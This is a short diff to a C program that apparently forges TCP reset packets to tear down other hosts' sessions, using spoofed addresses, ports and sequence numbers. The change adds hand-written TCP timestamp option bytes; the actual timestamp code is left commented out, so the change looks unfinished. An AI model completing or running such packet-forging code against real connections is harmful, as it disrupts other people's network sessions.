@@ -101,7 +101,7 @@ void display_usage(char *name) {
  * @param sequenceNumber    The sequence number to be acknowledged by the desination.
  * @param ackNumber         The last sequence number acknowledged by the source.
  */
-void disrupt_session(char *sourceIP, uint16_t sourcePort, char *destinationIP, uint16_t destinationPort, uint32_t sequenceNumber, uint32_t ackNumber) {
+void disrupt_session(char *sourceIP, uint16_t sourcePort, char *destinationIP, uint16_t destinationPort, uint32_t sequenceNumber, uint32_t ackNumber, int timestamp) {
     static bool checked = false;
 //    static uint32_t prevSeq = 0;
 //    static uint32_t prevAck = 0;
@@ -161,7 +161,36 @@ void disrupt_session(char *sourceIP, uint16_t sourcePort, char *destinationIP, u
                 RESET_ON,
                 "",
                 packet,
-                sizeof(struct tcphdr) + sizeof(struct iphdr) + 2);
+                sizeof(struct tcphdr) + sizeof(struct iphdr) + 2 + 12);
+
+    char *nopPtr = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
+    *nopPtr = 0x01;
+    nopPtr++;
+    *nopPtr = 0x01;
+    nopPtr++;
+    *nopPtr = 0x08;
+    nopPtr++;
+    *nopPtr = 0x0a;
+    nopPtr++;
+    *nopPtr = 0x01;
+    nopPtr++;
+    *nopPtr = 0x01;
+    nopPtr++;
+    *nopPtr = 0x01;
+    nopPtr++;
+    *nopPtr = 0x01;
+    nopPtr++;
+    *nopPtr = 0x01;
+    nopPtr++;
+    *nopPtr = 0x01;
+    nopPtr++;
+    *nopPtr = 0x01;
+    nopPtr++;
+    *nopPtr = 0x01;
+    nopPtr++;
+//    int *timeStampPtr = (int *)nopPtr;
+
+    
 
     // Send out the packet
     send_packet(sock, packet, addr_in);
